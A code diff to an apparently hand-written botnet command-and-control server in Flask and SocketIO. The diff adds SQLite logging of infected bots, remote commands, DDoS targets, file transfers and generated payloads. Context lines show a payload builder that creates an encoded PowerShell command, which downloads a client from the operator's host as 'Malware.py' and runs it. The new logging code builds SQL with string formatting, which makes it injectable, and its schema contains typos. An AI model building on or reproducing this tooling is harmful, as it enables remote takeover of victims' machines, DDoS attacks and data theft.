@@ -2,12 +2,20 @@
 
 from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 from flask_socketio import SocketIO
-import os, subprocess, base64
+import os, subprocess, base64, sqlite3, threading
 
 MAX_BUFFER_SIZE = 50 * 1000 * 1000
 app = Flask(__name__)
 server = SocketIO(app, max_http_buffer_size=MAX_BUFFER_SIZE)
 app.secret_key = 'Fixer'
+events = sqlite3.connect("Events.db")
+if not os.path.exists("Events.db"):
+    events.execute("Create table Bots (bot_id INT AUTO_INCREMENT PRIMARY KEY, hostname VARCHAR(50), ip_address VARCHAR(15), os VRACHAR(50), status VARCHAR(5))")
+    events.execute("Create table Modules (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), status VARCHAR(150))")
+    events.execute("Create table Commands (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), output VARCHAR(8))")
+    events.execute("Create table DDOS_Attacks (serial_no INT AUTO_INCREMENT PRIMARY KEY, target VRACHAR(15))")
+    events.execute("Create table File_Transfer (bot_id INT PRIMARY KEY, hostname VARCHAR(50), transfer_type VRACHAR(80), filename VARCHAR(350), status VARCHAR(250))")
+    events.execute("Create table Payloads (serial_no INT AUTO_INCREMENT PRIMARY KEY, server_ip VARCHAR(15), port VARCHAR(5), force_convert VARCHAR(5))")
 
 USERNAME = 'admin'
 PASSWORD = 'admin9876'
@@ -61,6 +69,8 @@ def payload():
     payload_ip = request.args.get('serverIP')
     payload_port = request.args.get('port')
     force_convert = request.args.get('forceConvert', False)
+    eventlogger_special = threading.Thread(target=eventlog_for_payload, args=(payload_ip, payload_port, force_convert))
+    eventlogger_special.start()
     if force_convert != 'on':
         initial_string = rf'$url = "http://{payload_ip}:{payload_port}/Client.py"; $destination = "C:\Program Files\WindowsPowerShell\Malware.py"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
         payload_string = base64.b64encode(initial_string.encode()).decode()
@@ -83,6 +93,13 @@ def pytoexe():
         return True
     else:
         return False
+
+def eventlog_for_payload(payload_ip, payload_port, force_convert):
+    events = sqlite3.connect("Events.db")
+    insert = f'''insert into Payloads (server_ip, port, force_convert) VALUES ("{payload_ip}", "{payload_port}", "{force_convert}")'''
+    events.execute(insert)
+    events.commit()
+    events.close()
 
 @app.route('/modules', methods=['GET', 'POST'])
 def modules():
@@ -112,6 +129,11 @@ def handle_modules_output(module_output):
     hostname = module_output.get('hostname')
     status = module_output.get('result')
     completedTasks.append({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': status})
+    events = sqlite3.connect("Events.db")
+    insert = f'''insert into Modules (bot_id, hostname, command, status) VALUES ("{idNumber}", "{hostname}", "{command}", "{status}")'''
+    events.execute(insert)
+    events.commit()
+    events.close()
 
 @app.route('/commands', methods=['GET'])
 def commands():
@@ -136,7 +158,15 @@ def commands():
 @server.on('commands_output')
 def handle_commands_output(output):
     global command_output
+    idNumber = output.get('idNumber')
+    hostname = output.get('hostname')
+    command = output.get('command')
     command_output = output.get('output')
+    events = sqlite3.connect("Events.db")
+    insert = f'''insert into Commands (bot_id, hostname, command, output) VALUES ("{idNumber}", "{hostname}", "{command}", "RECEIVED / FAILED")'''
+    events.execute(insert)
+    events.commit()
+    events.close()
 
 @app.route('/ping', methods=['GET'])
 def ping():
@@ -156,11 +186,17 @@ def send_ping(ip_address):
 @server.on('ping_output')
 def handle_ping_output(ping_output):
     idNumber = ping_output.get('idNumber')
+    target = ping_output.get('target')
     output = ping_output.get('output')
     client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
     if client_info:
         hostname = client_info.hostname
-        ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'output': output})
+        ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'target': target, 'output': output})
+        events = sqlite3.connect("Events.db")
+        insert = f'''insert into DDOS_Attacks (target) VALUES ("{target}")'''
+        events.execute(insert)
+        events.commit()
+        events.close()
 
 @app.route('/file_transfer', methods=['GET'])
 def file_transfer():
@@ -192,6 +228,11 @@ def file_status_update(file_status):
     file_name = file_status.get('file_name')
     status = file_status.get('status')
     file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+    events = sqlite3.connect("Events.db")
+    insert = f'''insert into File_Transfer (bot_id, hostname, transfer_type, filename, status) VALUES ("{idNumber}", "{hostname}", "{transfer_type}", "{file_name}", "{status}")'''
+    events.execute(insert)
+    events.commit()
+    events.close()
 
 @server.on('download_from_client')
 def download(input):
@@ -256,6 +297,14 @@ def onDisconnect():
 @server.on('Initial_Information')
 def handleInformation(Initial_Information):
     database.append(Client(Initial_Information))
+    hostname = Initial_Information.get("hostname")
+    operating_system = Initial_Information.get("OS")
+    ip = Initial_Information.get("IP")
+    events = sqlite3.connect("Events.db")
+    insert = f'''insert into Bots (hostname, ip_address, os, status) VALUES ("{hostname}", "{ip}", "{operating_system}", "Alive")'''
+    events.execute(insert)
+    events.commit()
+    events.close()
 
 if __name__ == '__main__':
     server.run(app, host=server_ip, port=server_port)
